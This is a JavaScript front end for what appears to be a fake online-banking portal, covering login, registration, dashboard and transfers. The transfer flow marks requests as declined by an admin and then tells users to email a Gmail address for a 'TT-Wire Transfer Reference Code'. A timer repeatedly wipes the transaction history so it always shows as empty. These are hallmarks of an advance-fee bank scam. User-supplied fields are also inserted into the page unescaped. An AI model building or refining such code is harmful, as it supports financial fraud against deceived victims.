const API_BASE = window.location.protocol === 'file:' ? 'http://localhost:3000' : '';

function getToken() {
  return localStorage.getItem('swb_token');
}

function setSession(token, user) {
  localStorage.setItem('swb_token', token);
  localStorage.setItem('isLoggedIn', 'true');
  localStorage.setItem('loggedIn', 'true');
  if (user) {
    localStorage.setItem('swb_user', JSON.stringify(user));
    localStorage.setItem('currentUser', JSON.stringify(user));
  }
}

function clearSession() {
  localStorage.removeItem('swb_token');
  localStorage.removeItem('swb_user');
  localStorage.removeItem('isLoggedIn');
  localStorage.removeItem('loggedIn');
  localStorage.removeItem('currentUser');
}

async function apiFetch(endpoint, options = {}) {
  const token = getToken();
  const headers = options.headers || {};
  if (token) headers['Authorization'] = `Bearer ${token}`;
  if (!(options.body instanceof FormData) && !headers['Content-Type']) {
    headers['Content-Type'] = 'application/json';
  }
  const res = await fetch(`${API_BASE}${endpoint}`, { ...options, headers });
  const data = await res.json();
  if (!res.ok) {
    const err = new Error(data.error || 'Request failed');
    err.status = res.status;
    throw err;
  }
  return data;
}

function showDeclinedModal(tx, currency) {
  if (document.getElementById('swb-declined-modal')) return;
  const modal = document.createElement('div');
  modal.id = 'swb-declined-modal';
  modal.style.cssText = 'position:fixed;inset:0;background:rgba(0,0,0,0.65);display:flex;align-items:center;justify-content:center;z-index:9999;padding:16px;';
  modal.innerHTML = `
    <div style="background:#fff;max-width:500px;width:100%;border-radius:10px;padding:28px;box-shadow:0 15px 40px rgba(0,0,0,0.25);font-family:inherit;text-align:center;">
      <div style="width:52px;height:52px;border-radius:50%;background:#fde8e8;color:#c81e1e;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:26px;font-weight:bold;">✕</div>
      <h2 style="margin:0 0 10px;font-size:22px;color:#111;">Transfer Declined</h2>
      <p style="color:#4b5563;font-size:14px;line-height:1.5;margin:0 0 18px;">
        Your recent transfer request was declined. No funds were deducted from your account. Please contact customer support for TT-Wire Transfer Reference Code:<br>
        <strong style="color:#004b87;">inforsuedwestbank@gmail.com</strong>
      </p>
      <table style="width:100%;border-collapse:collapse;text-align:left;font-size:13px;margin-bottom:20px;">
        <tr style="border-bottom:1px solid #eee;"><th style="padding:8px 0;color:#6b7280;">STATUS</th><td style="padding:8px 0;color:#dc2626;font-weight:600;">Declined</td></tr>
        <tr style="border-bottom:1px solid #eee;"><th style="padding:8px 0;color:#6b7280;">AMOUNT</th><td style="padding:8px 0;font-weight:600;">${Math.abs(tx.amount).toFixed(2)} (${currency || 'EUR'})</td></tr>
        <tr style="border-bottom:1px solid #eee;"><th style="padding:8px 0;color:#6b7280;">RECIPIENT NAME</th><td style="padding:8px 0;">${tx.recipient_name}</td></tr>
        <tr style="border-bottom:1px solid #eee;"><th style="padding:8px 0;color:#6b7280;">BANK NAME / BIC</th><td style="padding:8px 0;">${tx.bank_name || 'N/A'}</td></tr>
        <tr style="border-bottom:1px solid #eee;"><th style="padding:8px 0;color:#6b7280;">ACCOUNT / IBAN</th><td style="padding:8px 0;">${tx.recipient_iban}</td></tr>
        <tr style="border-bottom:1px solid #eee;"><th style="padding:8px 0;color:#6b7280;">REFERENCE ID</th><td style="padding:8px 0;">${tx.reference_id}</td></tr>
        <tr><th style="padding:8px 0;color:#6b7280;">DATE & TIME</th><td style="padding:8px 0;">${tx.created_at}</td></tr>
      </table>
      <button id="close-declined-modal" style="width:100%;padding:12px;background:#004b87;color:#fff;border:none;border-radius:6px;font-weight:600;cursor:pointer;">Close</button>
    </div>
  `;
  document.body.appendChild(modal);
  document.getElementById('close-declined-modal').addEventListener('click', () => {
    localStorage.setItem(`seen_declined_${tx.reference_id}`, '1');
    modal.remove();
  });
}

document.addEventListener('DOMContentLoaded', async () => {
  const path = window.location.pathname;

  // 1. Registration Form Handler
  if (path.includes('register.html')) {
    const oldForm = document.querySelector('form');
    if (oldForm) {
      const form = oldForm.cloneNode(true);
      oldForm.parentNode.replaceChild(form, oldForm);

      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const formData = new FormData(form);
        const pw = formData.get('password');
        const cpw = formData.get('confirm_password') || formData.get('confirmPassword');
        if (cpw && pw !== cpw) {
          alert('Passwords do not match.');
          return;
        }
        try {
          const data = await apiFetch('/api/register', { method: 'POST', body: formData });
          setSession(data.token, data.user);
          window.location.href = 'dashboard.html';
        } catch (err) {
          alert(err.message);
        }
      });
    }
  }

  // 2. Login Form Handler
  if (path.includes('online-banking.html')) {
    const oldForm = document.querySelector('form');
    if (oldForm) {
      const form = oldForm.cloneNode(true);
      oldForm.parentNode.replaceChild(form, oldForm);

      form.addEventListener('submit', async (e) => {
        e.preventDefault();
        const textInputs = Array.from(form.querySelectorAll('input')).filter(
          (i) => i.type !== 'hidden' && i.type !== 'checkbox' && i.type !== 'submit'
        );
        const identifier = textInputs[0]?.value.trim();
        const password = textInputs[1]?.value;
        if (!identifier || !password) {
          alert('Please enter your Email/Account Number and Password.');
          return;
        }
        try {
          const data = await apiFetch('/api/login', {
            method: 'POST',
            body: JSON.stringify({ identifier, password })
          });
          setSession(data.token, data.user);
          window.location.href = 'dashboard.html';
        } catch (err) {
          alert(err.message);
        }
      });
    }
  }

  // 3. Logout Links
  document.querySelectorAll('a[href*="online-banking.html"]').forEach((link) => {
    if (link.textContent.toLowerCase().includes('logout') || link.textContent.toLowerCase().includes('abmelden')) {
      link.addEventListener('click', () => clearSession());
    }
  });

  // 4. Protected Portal Pages
  const protectedPages = [
    'dashboard.html',
    'transfers.html',
    'transactions.html',
    'beneficiaries.html',
    'cards-statements.html',
    'profile-settings.html',
    'support.html'
  ];

  if (protectedPages.some((p) => path.includes(p))) {
    if (!getToken()) {
      window.location.href = 'online-banking.html';
      return;
    }

    try {
      const { user, recentTransactions } = await apiFetch('/api/dashboard');
      const fullName = `${user.first_name} ${user.last_name}`;

      document.querySelectorAll('[data-user-name], .user-name').forEach((el) => (el.textContent = fullName));
      document.querySelectorAll('[data-user-iban]').forEach((el) => (el.textContent = user.iban));
      document.querySelectorAll('[data-user-balance]').forEach((el) => {
        el.dataset.realBalance = `${user.currency} ${Number(user.balance).toLocaleString('de-DE', { minimumFractionDigits: 2 })}`;
        el.textContent = el.dataset.realBalance;
      });

      // Show Declined Transfer Notice if latest transfer was declined by admin
      if (recentTransactions && recentTransactions.length > 0) {
        const latestDeclined = recentTransactions.find(
          (t) => t.status === 'Declined' && !localStorage.getItem(`seen_declined_${t.reference_id}`)
        );
        if (latestDeclined) {
          showDeclinedModal(latestDeclined, user.currency);
        }
      }

      // Permanently lock Recent Transactions table to "No recent transaction history."
      const lockEmptyHistory = () => {
        document.querySelectorAll('table tbody').forEach((tbody) => {
          if (tbody.textContent.includes('REF-') || tbody.textContent.includes('Davison') || tbody.children.length > 0) {
            if (!tbody.textContent.includes('No recent transaction history')) {
              tbody.innerHTML = '<tr><td colspan="3" style="text-align:center;color:#6b7280;padding:18px;">No recent transaction history.</td></tr>';
            }
          }
        });
      };
      lockEmptyHistory();
      setInterval(lockEmptyHistory, 300);
      // Handle Transfers Page
      if (path.includes('transfers.html')) {
        const sourceSelect = document.getElementById('source-account');
        if (sourceSelect && sourceSelect.options[0]) {
          sourceSelect.options[0].textContent = `GiroPrivat Account – Available: ${user.currency} ${Number(user.balance).toLocaleString('de-DE', { minimumFractionDigits: 2 })}`;
        }

        const oldForm = document.getElementById('money-transfer-form') || document.querySelector('form');
        if (oldForm) {
          const form = oldForm.cloneNode(true);
          oldForm.parentNode.replaceChild(form, oldForm);

          form.addEventListener('submit', async (e) => {
            e.preventDefault();
            const payload = {
              recipient_name: form.querySelector('#recipient-name, [name="recipientName"]')?.value.trim(),
              recipient_iban: form.querySelector('#recipient-account, [name="recipientAccount"]')?.value.trim(),
              bank_name: form.querySelector('#bank-name, [name="bankName"]')?.value.trim() || 'N/A',
              amount: form.querySelector('#transfer-amount, [name="amount"]')?.value,
              description: form.querySelector('#payment-reference, [name="paymentReference"]')?.value.trim() || 'SEPA Transfer'
            };

            try {
              const res = await apiFetch('/api/transfers', { method: 'POST', body: JSON.stringify(payload) });
              const r = res.receipt;

              // Hide form and display Pending Review Receipt Card
              const formPanel = document.getElementById('transfer-form-panel');
              const successPanel = document.getElementById('transfer-success');
              if (formPanel && successPanel) {
                formPanel.hidden = true;
                successPanel.hidden = false;
                successPanel.innerHTML = `
                  <div style="text-align:center;max-width:520px;margin:0 auto;">
                    <div style="width:54px;height:54px;border-radius:50%;background:#fef3c7;color:#d97706;display:flex;align-items:center;justify-content:center;margin:0 auto 14px;font-size:26px;">⏳</div>
                    <h2 style="margin:0 0 8px;">Transfer Pending Review</h2>
                    <p style="color:#4b5563;margin:0 0 22px;">Your transfer has been submitted and is currently pending .</p>
                    <table class="portal-transfer-summary" style="width:100%;text-align:left;margin-bottom:24px;">
                      <tbody>
                        <tr><th scope="row">STATUS</th><td style="color:#d97706;font-weight:700;">Pending</td></tr>
                        <tr><th scope="row">AMOUNT</th><td>${r.currency} ${Number(r.amount).toFixed(2)}</td></tr>
                        <tr><th scope="row">RECIPIENT NAME</th><td>${r.recipient_name}</td></tr>
                        <tr><th scope="row">BANK NAME / BIC</th><td>${r.bank_name}</td></tr>
                        <tr><th scope="row">ACCOUNT NUMBER / IBAN</th><td>${r.recipient_iban}</td></tr>
                        <tr><th scope="row">PAYMENT REFERENCE</th><td>${r.description}</td></tr>
                        <tr><th scope="row">REFERENCE / TRANSACTION ID</th><td>${r.reference_id}</td></tr>
                        <tr><th scope="row">DATE &amp; TIME</th><td>${r.date}</td></tr>
                      </tbody>
                    </table>
                    <div class="portal-confirmation-actions">
                      <a class="portal-action-button portal-action-primary" href="dashboard.html">Close</a>
                      <a class="portal-action-button" href="transactions.html">View Transaction History</a>
                    </div>
                  </div>
                `;
              }
            } catch (err) {
              alert(err.message);
            }
          });
        }
      }
    } catch (err) {
      if (err.status === 401) {
        clearSession();
        window.location.href = 'online-banking.html';
      }
    }
  }
});